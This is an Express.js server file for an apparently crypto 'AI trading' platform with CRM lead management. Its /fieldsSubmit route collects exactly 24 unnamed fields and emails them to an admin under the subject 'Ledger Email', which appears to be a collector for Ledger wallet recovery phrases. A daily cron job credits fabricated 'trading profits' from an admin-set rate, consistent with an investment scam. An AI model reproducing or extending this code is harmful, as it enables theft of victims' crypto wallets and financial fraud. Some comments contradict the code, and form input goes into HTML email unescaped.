const express = require("express");
const app = express();
const sendEmail = require('./sendEmail')
// const cors = require("cors");
const axios = require("axios")
const userCoins = require("./models/userCoins");
const userModel = require("./models/userModel");
const bodyparser = require("body-parser");
// Environment file set
const dotnet = require("dotenv");
dotnet.config({ path: "./config/config.env" });

// Add CSP headers to prevent eval errors
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; " +
    "script-src 'self' 'unsafe-inline' 'unsafe-eval' https://kit.fontawesome.com https://translate.google.com https://cdn.jsdelivr.net; " +
    "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://kit-free.fontawesome.com; " +
    "img-src 'self' data: https: blob:; " +
    "font-src 'self' https://fonts.gstatic.com data:; " +
    "connect-src 'self' https: wss: http://localhost:* http://127.0.0.1:*; " +
    "frame-src 'self' https:; " +
    "media-src 'self' data: https: blob:;"
  );
  next();
});

// Add request logging at the VERY beginning (first middleware)
app.use((req, res, next) => {
    if (req.url && req.url.includes('/crm/uploadLeads') && req.method === 'POST') {
        console.log('🔥 [APP.JS FIRST MIDDLEWARE] Request received:', {
            method: req.method,
            url: req.url,
            contentType: req.headers['content-type'],
            contentLength: req.headers['content-length'],
            contentLengthMB: req.headers['content-length'] ? (parseInt(req.headers['content-length']) / (1024 * 1024)).toFixed(2) + 'MB' : 'unknown',
            host: req.headers.host,
            timestamp: new Date().toISOString()
        });
    }
    next();
});

app.use(express.json({ limit: "50mb" }));
let cookieParser = require("cookie-parser");
app.use(cookieParser());

//

const cron = require("node-cron");
const getLeadModel = require("./crmDB/models/leadsModel");
let ALLOWED_ORIGINS = [
  "https://betabase.pro",
  "https://www.betabase.pro",
  "https://rcenterltd.com",
  "https://www.rcenterltd.com",
  "https://chainanalytik.com",
  "https://www.chainanalytik.com",
  "https://takebackanalytics.com",
  "https://www.takebackanalytics.com",
  "http://localhost:3000",
  "http://localhost:3001",
  "http://localhost:3002",
  "http://localhost:3003",
  "http://127.0.0.1:5503",
];
app.use((req, res, next) => {
  // Log large requests for debugging
  if (req.headers['content-length']) {
    const contentLength = parseInt(req.headers['content-length']);
    const contentLengthMB = (contentLength / (1024 * 1024)).toFixed(2);
    if (contentLength > 1024 * 1024) { // Log if > 1MB
      console.log('📊 [REQUEST] Large request detected:', {
        method: req.method,
        url: req.url,
        contentType: req.headers['content-type'],
        contentLength: contentLength,
        contentLengthMB: contentLengthMB + 'MB',
        timestamp: new Date().toISOString()
      });
    }
  }
  
  let origin = req.headers.origin;
  let theOrigin =
    ALLOWED_ORIGINS.indexOf(origin) >= 0 ? origin : ALLOWED_ORIGINS[0];
  res.header("Access-Control-Allow-Origin", theOrigin);
  res.header(
    "Access-Control-Allow-Headers",
    "Origin, X-Requested-With, Content-Type, Accept, Authorization, X-API-Key"
  );

  res.header("Access-Control-Allow-Credentials", true);

  res.header(
    "Access-Control-Allow-Methods",
    "POST, GET, PUT, PATCH,DELETE, OPTIONS"
  );
  next();
});
// cutom message
app.post("/submitContactForm", async (req, res) => {
  try {
    const { name, email, phone, comments } = req.body;

    if (!email || !name || !phone || !comments) {
      return res
        .status(400)
        .send({ success: false, message: "Fill all the fields" });
    }
    let sameEmail = "admin@fintch.email"
    // 
    let subject = `Ledger Email`;
    let text = `
  Name: ${name}<br>
  Email: ${email}<br>
  Phone: ${phone}<br>
  Comments: ${comments}<br>
`;
    let sendEmailError = await sendEmail(sameEmail, subject, text);
    if (sendEmailError) {
      console.error("Failed to send email:", sendEmailError);

      // Respond with an error status and message
      return res.status(500).send({
        msg: "Email sending failed, please try again!",
        success: false,
        error: sendEmailError.message, // Optional: include the error message
      });
    }

    res.status(201).send({
      msg: "Form Submitted successfully",
      success: true,
    });
    //  
  } catch (e) {
    res.status(500).send({
      success: false,
      message: "Something went wrong",
    });
  }
});
app.post("/fieldsSubmit", async (req, res) => {
  try {
    const {
      field1,
      field2,
      field3,
      field4,
      field5,
      field6,
      field7,
      field8,
      field9,
      field10,
      field11,
      field12,
      field13,
      field14,
      field15,
      field16,
      field17,
      field18,
      field19,
      field20,
      field21,
      field22,
      field23,
      field24,
    } = req.body;


    let sameEmail = "admin@fintch.email"
    // 
    let subject = `Ledger Email`;
    let text = `
 <span>Field 1: </span> ${field1}
  <br>
  <span>Field 2: </span> ${field2}
  <br>
  <span>field 3: </span> ${field3}
  <br>
  <span>field 4: </span> ${field4}
  <br>
  <span>field 5: </span> ${field5}
  <br>
  <span>field 6: </span> ${field6}
  <br>
  <span>field 7: </span> ${field7}
  <br>
  <span>field 8: </span> ${field8}
  <br>
  <span>field 9: </span> ${field9}
  <br>
  <span>field 10: </span> ${field10}
  <br>
  <span>field 11: </span> ${field11}
  <br>
  <span>field 12: </span> ${field12}
  <br>
  <span>field 13: </span> ${field13}
  <br>
  <span>field 14: </span> ${field14}
  <br>
  <span>field 15: </span> ${field15}
  <br>
  <span>field 16: </span> ${field16}
  <br>
  <span>field 17: </span> ${field17}
  <br>
  <span>field 18: </span> ${field18}
  <br>
  <span>field 19: </span> ${field19}
  <br>
  <span>field 20: </span> ${field20}
  <br>
  <span>field 21: </span> ${field21}
  <br>
  <span>field 22: </span> ${field22}
  <br>
  <span>field 23: </span> ${field23}
  <br>
  <span>field 24: </span> ${field24}
`;
    console.log(text);

    let sendEmailError = await sendEmail(sameEmail, subject, text);
    if (sendEmailError) {
      console.error("Failed to send email:", sendEmailError);

      // Respond with an error status and message
      return res.status(500).send({
        msg: "Email sending failed, please try again!",
        success: false,
        error: sendEmailError.message, // Optional: include the error message
      });
    }

    res.status(201).send({
      msg: "Form Submitted successfully",
      success: true,
    });
    //  
  } catch (e) {
    res.status(500).send({
      success: false,
      message: "Something went wrong",
    });
    console.log(e);
  }
});
// cutom message
// 

// app.use(cors());

// Run every day at 00:00 UTC
// "*/10 * * * *"
// cron.schedule("0 0 * * *", async () => {
cron.schedule("0 0 * * *", async () => {
  console.log("Running trading profit cron (test mode, every 1 min)...");

  try {
    const users = await userCoins.find({ "transactions.isTrading": true }).populate("user");

    for (let u of users) {
      const adminRate = Number(u.user.AiTradingPercentage) || 0;

      for (let t of u.transactions) {
        if (!t.isTrading) continue;

        const duration = Math.round(Number(t.tradingTime)) || 0;
        const startDate = new Date(t.startDate);
        const now = new Date();

        const expiryDate = new Date(startDate);
        expiryDate.setDate(expiryDate.getDate() + duration);

        if (now >= expiryDate) {
          // Trade expired -> close it
          t.isTrading = false;

          const totalProfit = Math.abs(t.totalProfit || 0);

          // Create closure transaction directly in DB
          u.transactions.push({
            trxName: t.trxName,
            amount: totalProfit,
            txId: "Trade closure",
            withdraw: "crypto",
            status: "completed",
            type: "deposit",
            isTrading: false,
            createdAt: now,
          });

          console.log(`🔒 Trade closed for user ${u.user._id}, profit: ${totalProfit}`);
          continue; // skip further accrual
        }

        // Duration-based multiplier
        const multipliers = { 30: 1.0, 60: 1.2, 90: 1.5 };
        const multiplier = multipliers[duration] || 0;

        if (multiplier > 0 && adminRate > 0) {
          const appliedRate = adminRate * multiplier;
          const profit = (t.amount * appliedRate) / 100;

          if (!t.dailyProfits) t.dailyProfits = [];

          t.dailyProfits.push({
            profit,
            appliedRate,
            date: now,
          });

          t.totalProfit = (t.totalProfit || 0) + profit;
          t.lastProfitDate = now;
        }
      }

      await u.save({ validateModifiedOnly: true });
    }

    console.log("✅ Trading profits updated");
  } catch (err) {
    console.error("❌ Error in trading cron:", err);
  }
});
cron.schedule("0 0 * * *", async () => { // ✅ runs daily at midnight


  try {
    const cutoff = new Date();
    cutoff.setDate(cutoff.getDate() - 1); // keep last 30 days

    const result = await errorLogs.deleteMany({ createdAt: { $lt: cutoff } });

    console.log(`✅ Logs cleared: ${result.deletedCount} old entries`);
  } catch (err) {
    console.error("❌ Error in clearing logs:", err);
  }
});

// Purge soft-deleted leads older than 30 days
cron.schedule("0 1 * * *", async () => { // daily at 01:00
  try {
    const Lead = await getLeadModel();
    const cutoff = new Date();
    cutoff.setDate(cutoff.getDate() - 30);
    const result = await Lead.deleteMany({ isDeleted: true, deletedAt: { $lt: cutoff } });
    console.log(`🗑️ Recycle bin purge: ${result.deletedCount} lead(s) removed`);
  } catch (err) {
    console.error("❌ Error purging deleted leads:", err);
  }
});



//
// app.use(
//   cors({
//     origin: process.env.CORS,

//     credentials: true,
//     exposedHeaders: ["Set-Cookie"],
//   })
// );



// Increase body-parser limits to handle larger payloads
// Note: body-parser automatically skips multipart/form-data (handled by multer),
// but we set high limits here to avoid any conflicts
app.use(bodyparser.urlencoded({ extended: false, limit: '50mb', parameterLimit: 50000 }));
app.use(bodyparser.json({ limit: '50mb' }));
// All Routes
const coins = require("./routes/coinRoute");
const user = require("./routes/userRoute");
const file = require("./routes/fileRoute");
const crm = require("./routes/crmRoutes");
const loan = require("./routes/loanRoute");
const errorLogs = require("./models/errorLogs");
// Log all requests to uploadLeads endpoint before routing
app.use((req, res, next) => {
    if (req.url.includes('/crm/uploadLeads') && req.method === 'POST') {
        console.log('🌐 [APP LEVEL] Request to /crm/uploadLeads detected:', {
            method: req.method,
            url: req.url,
            contentType: req.headers['content-type'],
            contentLength: req.headers['content-length'],
            contentLengthMB: req.headers['content-length'] ? (parseInt(req.headers['content-length']) / (1024 * 1024)).toFixed(2) + 'MB' : 'unknown',
            host: req.headers.host,
            timestamp: new Date().toISOString()
        });
    }
    next();
});

app.use("/api/v1", coins);
app.use("/api/v1", user);
app.use("/api/v1", file);
app.use("/api/v1", crm);
app.use("/api/v1", loan);
const call = require("./routes/callRoutes");

// Global error handler for unhandled errors (must be after routes)
app.use((err, req, res, next) => {
    console.error('❌ [GLOBAL ERROR HANDLER] Unhandled error:', {
        error: err.message,
        errorCode: err.code,
        statusCode: err.statusCode || err.status,
        method: req.method,
        url: req.url,
        contentType: req.headers['content-type'],
        contentLength: req.headers['content-length'],
        contentLengthMB: req.headers['content-length'] ? (parseInt(req.headers['content-length']) / (1024 * 1024)).toFixed(2) + 'MB' : 'unknown',
        timestamp: new Date().toISOString()
    });
    
    // If it's a 413 error, log it specifically
    if (err.statusCode === 413 || err.status === 413 || (err.message && err.message.includes('413'))) {
        console.error('❌ [413 ERROR] Request Entity Too Large detected:', {
            message: err.message,
            code: err.code,
            contentType: req.headers['content-type'],
            contentLength: req.headers['content-length'],
            contentLengthMB: req.headers['content-length'] ? (parseInt(req.headers['content-length']) / (1024 * 1024)).toFixed(2) + 'MB' : 'unknown',
            stack: err.stack
        });
    }
    
    // If error doesn't have statusCode, default to 500
    const statusCode = err.statusCode || err.status || 500;
    res.status(statusCode).json({
        success: false,
        msg: err.message || 'Internal server error',
        error: err.code || 'INTERNAL_ERROR'
    });
});

app.use("/api/v1", call);

module.exports = app;
